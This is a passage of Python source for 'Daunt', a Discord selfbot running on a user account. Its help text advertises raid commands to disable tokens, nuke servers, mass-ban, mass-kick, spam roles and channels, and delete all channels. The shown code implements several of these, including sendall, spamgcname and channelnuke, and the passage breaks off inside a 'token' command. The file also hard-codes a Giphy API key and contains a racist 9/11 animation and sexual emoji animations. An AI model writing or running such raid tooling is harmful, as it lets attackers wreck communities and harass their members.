        embed.description = f"\n`> copycat <user>` - copies the users messages ({Daunt.copycat})\n`> stopcopycat` - stops copycatting\n`> fakename` - makes a fakename with other members's names\n`> geoip <ip>` - looks up the ip's location\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`> sendall <message>` - sends a message in every channel\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> hack <user>` - hacks the user\n`> token <user>` - returns the user's token\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "raid":
        embed = discord.Embed(color=(0x2f3136) )
        embed.set_author(name="dauntless™",
                         icon_url=Daunt.user.avatar_url)
        embed.set_footer(text="»  daunt » Nuke Commands",
                        icon_url="https://i.vgy.me/aA2N2j.png")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/824358226975916092/827602553972719657/source.gif")
        embed.set_image(url="")
        embed.description = f"\n`> tokenfuck <token>` - disables the token\n`> nuke` - nukes the server\n`> massban` - bans everyone in the server\n`> dynoban` - mass bans with dyno one message at a time\n`> masskick` - kicks everyone in the server\n`> spamroles` - spam makes 250 roles\n`> spamchannels` - spam makes 250 text channels\n`> delchannels` - deletes all channels in the server\n`> delroles` - deletes all roles in the server\n`> purgebans` - unbans everyone\n`> renamechannels <name>` - renames all channels\n`> servername <name>` - renames the server to the specified name\n`> nickall <name>` - sets all user's nicknames to the specified name\n`> changeregion <amount>` - spam changes regions in groupchats\n`> kickgc` - kicks everyone in the gc\n`> spamgcname` - spam changes the groupchat name\n`> massmention <message>` - mass mentions random people\n`> giveadmin` - gives all admin roles in the server"
        await ctx.send(embed=embed)


@Daunt.command()
async def credits(ctx):
    await ctx.message.delete()
    await ctx.send("""```fix

▓█████▄  ▄▄▄       █    ██  ███▄    █ ▄▄▄█████▓
▒██▀ ██▌▒████▄     ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒
░██   █▌▒██  ▀█▄  ▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░
░▓█▄   ▌░██▄▄▄▄██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ 
░▒████▓  ▓█   ▓██▒▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ 
 ▒▒▓  ▒  ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   
 ░ ▒  ▒   ▒   ▒▒ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░   k
 ░ ░  ░   ░   ▒    ░░░ ░ ░    ░   ░ ░   ░                  
   ░          ░  ░   ░              ░                      
 ░                                             
```""")


@Daunt.command(aliases=["giphy", "tenor", "searchgif"])
async def gif(ctx, query=None):
    await ctx.message.delete()
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])



@Daunt.command(aliases=["addemoji", "stealemote", "addemote"])
async def stealemoji(ctx):
    await ctx.message.delete()
    custom_regex = "<(?P<animated>a?):(?P<name>[a-zA-Z0-9_]{2,32}):(?P<id>[0-9]{18,22})>"
    unicode_regex = "(?:\U0001f1e6[\U0001f1e8-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f2\U0001f1f4\U0001f1f6-\U0001f1fa\U0001f1fc\U0001f1fd\U0001f1ff])|(?:\U0001f1e7[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ef\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1e8[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ee\U0001f1f0-\U0001f1f5\U0001f1f7\U0001f1fa-\U0001f1ff])|(?:\U0001f1e9[\U0001f1ea\U0001f1ec\U0001f1ef\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1ff])|(?:\U0001f1ea[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ed\U0001f1f7-\U0001f1fa])|(?:\U0001f1eb[\U0001f1ee-\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1f7])|(?:\U0001f1ec[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ee\U0001f1f1-\U0001f1f3\U0001f1f5-\U0001f1fa\U0001f1fc\U0001f1fe])|(?:\U0001f1ed[\U0001f1f0\U0001f1f2\U0001f1f3\U0001f1f7\U0001f1f9\U0001f1fa])|(?:\U0001f1ee[\U0001f1e8-\U0001f1ea\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9])|(?:\U0001f1ef[\U0001f1ea\U0001f1f2\U0001f1f4\U0001f1f5])|(?:\U0001f1f0[\U0001f1ea\U0001f1ec-\U0001f1ee\U0001f1f2\U0001f1f3\U0001f1f5\U0001f1f7\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1f1[\U0001f1e6-\U0001f1e8\U0001f1ee\U0001f1f0\U0001f1f7-\U0001f1fb\U0001f1fe])|(?:\U0001f1f2[\U0001f1e6\U0001f1e8-\U0001f1ed\U0001f1f0-\U0001f1ff])|(?:\U0001f1f3[\U0001f1e6\U0001f1e8\U0001f1ea-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f4\U0001f1f5\U0001f1f7\U0001f1fa\U0001f1ff])|\U0001f1f4\U0001f1f2|(?:\U0001f1f4[\U0001f1f2])|(?:\U0001f1f5[\U0001f1e6\U0001f1ea-\U0001f1ed\U0001f1f0-\U0001f1f3\U0001f1f7-\U0001f1f9\U0001f1fc\U0001f1fe])|\U0001f1f6\U0001f1e6|(?:\U0001f1f6[\U0001f1e6])|(?:\U0001f1f7[\U0001f1ea\U0001f1f4\U0001f1f8\U0001f1fa\U0001f1fc])|(?:\U0001f1f8[\U0001f1e6-\U0001f1ea\U0001f1ec-\U0001f1f4\U0001f1f7-\U0001f1f9\U0001f1fb\U0001f1fd-\U0001f1ff])|(?:\U0001f1f9[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ed\U0001f1ef-\U0001f1f4\U0001f1f7\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1ff])|(?:\U0001f1fa[\U0001f1e6\U0001f1ec\U0001f1f2\U0001f1f8\U0001f1fe\U0001f1ff])|(?:\U0001f1fb[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ee\U0001f1f3\U0001f1fa])|(?:\U0001f1fc[\U0001f1eb\U0001f1f8])|\U0001f1fd\U0001f1f0|(?:\U0001f1fd[\U0001f1f0])|(?:\U0001f1fe[\U0001f1ea\U0001f1f9])|(?:\U0001f1ff[\U0001f1e6\U0001f1f2\U0001f1fc])|(?:\U0001f3f3\ufe0f\u200d\U0001f308)|(?:\U0001f441\u200d\U0001f5e8)|(?:[\U0001f468\U0001f469]\u200d\u2764\ufe0f\u200d(?:\U0001f48b\u200d)?[\U0001f468\U0001f469])|(?:(?:(?:\U0001f468\u200d[\U0001f468\U0001f469])|(?:\U0001f469\u200d\U0001f469))(?:(?:\u200d\U0001f467(?:\u200d[\U0001f467\U0001f466])?)|(?:\u200d\U0001f466\u200d\U0001f466)))|(?:(?:(?:\U0001f468\u200d\U0001f468)|(?:\U0001f469\u200d\U0001f469))\u200d\U0001f466)|[\u2194-\u2199]|[\u23e9-\u23f3]|[\u23f8-\u23fa]|[\u25fb-\u25fe]|[\u2600-\u2604]|[\u2638-\u263a]|[\u2648-\u2653]|[\u2692-\u2694]|[\u26f0-\u26f5]|[\u26f7-\u26fa]|[\u2708-\u270d]|[\u2753-\u2755]|[\u2795-\u2797]|[\u2b05-\u2b07]|[\U0001f191-\U0001f19a]|[\U0001f1e6-\U0001f1ff]|[\U0001f232-\U0001f23a]|[\U0001f300-\U0001f321]|[\U0001f324-\U0001f393]|[\U0001f399-\U0001f39b]|[\U0001f39e-\U0001f3f0]|[\U0001f3f3-\U0001f3f5]|[\U0001f3f7-\U0001f3fa]|[\U0001f400-\U0001f4fd]|[\U0001f4ff-\U0001f53d]|[\U0001f549-\U0001f54e]|[\U0001f550-\U0001f567]|[\U0001f573-\U0001f57a]|[\U0001f58a-\U0001f58d]|[\U0001f5c2-\U0001f5c4]|[\U0001f5d1-\U0001f5d3]|[\U0001f5dc-\U0001f5de]|[\U0001f5fa-\U0001f64f]|[\U0001f680-\U0001f6c5]|[\U0001f6cb-\U0001f6d2]|[\U0001f6e0-\U0001f6e5]|[\U0001f6f3-\U0001f6f6]|[\U0001f910-\U0001f91e]|[\U0001f920-\U0001f927]|[\U0001f933-\U0001f93a]|[\U0001f93c-\U0001f93e]|[\U0001f940-\U0001f945]|[\U0001f947-\U0001f94b]|[\U0001f950-\U0001f95e]|[\U0001f980-\U0001f991]|\u00a9|\u00ae|\u203c|\u2049|\u2122|\u2139|\u21a9|\u21aa|\u231a|\u231b|\u2328|\u23cf|\u24c2|\u25aa|\u25ab|\u25b6|\u25c0|\u260e|\u2611|\u2614|\u2615|\u2618|\u261d|\u2620|\u2622|\u2623|\u2626|\u262a|\u262e|\u262f|\u2660|\u2663|\u2665|\u2666|\u2668|\u267b|\u267f|\u2696|\u2697|\u2699|\u269b|\u269c|\u26a0|\u26a1|\u26aa|\u26ab|\u26b0|\u26b1|\u26bd|\u26be|\u26c4|\u26c5|\u26c8|\u26ce|\u26cf|\u26d1|\u26d3|\u26d4|\u26e9|\u26ea|\u26fd|\u2702|\u2705|\u270f|\u2712|\u2714|\u2716|\u271d|\u2721|\u2728|\u2733|\u2734|\u2744|\u2747|\u274c|\u274e|\u2757|\u2763|\u2764|\u27a1|\u27b0|\u27bf|\u2934|\u2935|\u2b1b|\u2b1c|\u2b50|\u2b55|\u3030|\u303d|\u3297|\u3299|\U0001f004|\U0001f0cf|\U0001f170|\U0001f171|\U0001f17e|\U0001f17f|\U0001f18e|\U0001f201|\U0001f202|\U0001f21a|\U0001f22f|\U0001f250|\U0001f251|\U0001f396|\U0001f397|\U0001f56f|\U0001f570|\U0001f587|\U0001f590|\U0001f595|\U0001f596|\U0001f5a4|\U0001f5a5|\U0001f5a8|\U0001f5b1|\U0001f5b2|\U0001f5bc|\U0001f5e1|\U0001f5e3|\U0001f5e8|\U0001f5ef|\U0001f5f3|\U0001f6e9|\U0001f6eb|\U0001f6ec|\U0001f6f0|\U0001f930|\U0001f9c0|[#|0-9]\u20e3"


@Daunt.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if Daunt.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("That was fun wasn't it?")
    print(f'''
  [{Fore.MAGENTA}»{Fore.WHITE}] Stopped copying {Fore.MAGENTA}''' + str(Daunt.copycat) + (f'''{Fore.RESET}.'''))
    Daunt.copycat = None


@Daunt.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User):

    await ctx.message.delete()
    Daunt.copycat = user
    await ctx.send("Time to be annoying")
    print(f'''
  [{Fore.MAGENTA}»{Fore.WHITE}] Now copying {Fore.MAGENTA}''' + str(Daunt.copycat) + (f'''{Fore.RESET}.'''))

@Daunt.command(aliases=["9/11", "911", "terrorist"])
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')

@Daunt.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')


@Daunt.command()
async def clear(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')


@Daunt.command()
async def sendall(ctx, *, message):
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass


@Daunt.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "eSluts FTW"
        name = ""
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)


@Daunt.command(aliases=['nukechan'])
async def channelnuke(ctx):
    print(f'''
  [{Fore.MAGENTA}»{Fore.WHITE}] Channel Nuked in {Fore.MAGENTA}{ctx.guild.name}{Fore.RESET}.''')
    channel_position = ctx.channel.position
    new_chan = await ctx.channel.clone()
    await ctx.channel.delete()
    await new_chan.edit(position = channel_position) 
    embed=discord.Embed(title="Daunt",description=f"<#{new_chan.id}> - {new_chan.name} has been successfully nuked.", color=0x2f3136)
    embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/830570337850228766.gif?v=1")
    embed.set_footer(text="»  daunt  »  Channel Nuked", icon_url="https://i.vgy.me/aA2N2j.png")
    await new_chan.send(embed=embed,delete_after=5)


@Daunt.command(aliases=["fakename"])
async def genname(ctx):
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))


@Daunt.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)


@Daunt.command()
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.MAGENTA}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Website is down ({r})', delete_after=3)
        else:
            await ctx.send(f'Website is operational ({r})', delete_after=3)


@Daunt.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Daunt_tweet.png"))
            except:
                await ctx.send(res['message'])


@Daunt.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_magik.png"))
        except:
            await ctx.send(res['message'])


@Daunt.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in Daunt.guilds:
        await guild.ack()


@Daunt.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_fry.png"))
        except:
            await ctx.send(res['message'])


@Daunt.command()
async def blur(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/blur?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_blur.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_blur.png"))
        except:
            await ctx.send(endpoint)


@Daunt.command(aliases=["pixel"])
async def pixelate(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/pixelate?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_blur.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_blur.png"))
        except:
            await ctx.send(endpoint)


@Daunt.command()
async def supreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_supreme.png"))
    except:
        await ctx.send(endpoint)


@Daunt.command()
async def darksupreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20") + "&dark=true"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_dark_supreme.png"))
    except:
        await ctx.send(endpoint)


@Daunt.command(aliases=["facts"])
async def fax(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/facts?text=" + args.replace(" ", "%20")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_facts.png"))
    except:
        await ctx.send(endpoint)


@Daunt.command(aliases=["blurp"])
async def blurpify(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_blurpify.png"))
        except:
            await ctx.send(res['message'])


@Daunt.command()
async def invert(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/invert?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)


@Daunt.command()
async def gay(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/gay?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)


@Daunt.command()
async def communist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/communist?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)


@Daunt.command()
async def snow(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/snow?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)


@Daunt.command(aliases=["jpeg"])
async def jpegify(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/jpegify?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Daunt_invert.png"))
        except:
            await ctx.send(endpoint)


@Daunt.command(aliases=["pornhublogo", "phlogo"])
async def pornhub(ctx, word1=None, word2=None):
    await ctx.message.delete()
    if word1 is None or word2 is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace("{text-1}", word1).replace(
        "{text-2}", word2)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_pornhub_logo.png"))
    except:
        await ctx.send(endpoint)


@Daunt.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Daunt_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])


@Daunt.command()
async def token(ctx, user: discord.Member = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
